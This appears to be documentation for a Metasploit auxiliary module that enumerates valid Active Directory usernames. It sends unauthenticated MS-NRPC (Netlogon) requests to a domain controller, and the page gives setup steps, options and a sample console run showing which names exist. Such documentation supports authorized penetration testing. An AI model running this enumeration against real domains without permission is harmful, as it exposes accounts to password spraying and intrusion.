## Vulnerable Application

A new method for gathering domain users. The method leverages auth-level = 1 (No authentication) against the
MS-NRPC (Netlogon) interface on domain controllers. All that's required is the domain controller's IP address,
and the entire process can be completed without providing any credentials.

## Verification Steps

1. Do: `use auxiliary/gather/nrpc_enumusers`
2. Do: `set RHOSTS <targer IP addresses>`
3. Do: `set USER_FILE <path to your users list>`
4. Do: `run`


## Target

To use nrpc_enumusers, make sure you are able to connect to the Domain Controller.
It has been tested with Windows servers 2012, 2016, 2019 and 2022

## Options

### USER_FILE

**Description:** Path to the file containing the list of usernames to enumerate. Each username should be on a separate line.

**Usage:** Provide the path to the file that contains the list of user accounts you want to test.

**Example:** `set USER_FILE /path/to/usernames.txt`

2- `RHOSTS` (required)

**Description:** The target IP address or range of IP addresses of the Domain Controllers.

**Usage:** Specify the IP address or addresses of the Domain Controllers you are targeting.

**Example:** `set RHOSTS 192.168.1.100`

3- `RPORT` (optional)

**Description:** The port for the MS-NRPC interface. If not specified, the module will attempt to determine the endpoint.

**Usage:** If you know the port used by the MS-NRPC interface, you can specify it. Otherwise, the module will find it automatically.

**Example:** `set RPORT 49664`

## Scenarios

The following demonstrates basic usage, using a custom wordlist,
targeting a single Domain Controller to identify valid domain user accounts.

Create a new `./users.txt` file, then run the module:

```
msf6 auxiliary(gather/nrpc_enumusers) > set RHOSTS 192.168.177.177
RHOSTS => 192.168.177.177
msf6 auxiliary(gather/nrpc_enumusers) > set USER_FILE users.txt 
USER_FILE => users.txt
msf6 auxiliary(gather/nrpc_enumusers) > run

[*] 192.168.177.177: - Connecting to the endpoint mapper service...
[*] 192.168.177.177: - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.177.177[49664]...
[-] 192.168.177.177: - Tiffany.Molina does not exist
[-] 192.168.177.177: - SMITH does not exist
[-] 192.168.177.177: - JOHNSON does not exist
[-] 192.168.177.177: - WILLIAMS does not exist
[-] 192.168.177.177: - Administratorsvc_ldap does not exist
[-] 192.168.177.177: - svc_ldap does not exist
[-] 192.168.177.177: - ksimpson does not exist
[+] 192.168.177.177: - Administrator exists
[-] 192.168.177.177: - James does not exist
[-] 192.168.177.177: - nikk37 does not exist
[-] 192.168.177.177: - svc-printer does not exist
[-] 192.168.177.177: - SABatchJobs does not exist
[-] 192.168.177.177: - e.black does not exist
[-] 192.168.177.177: - Kaorz does not exist
[*] 192.168.177.177: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(gather/nrpc_enumusers) >
```
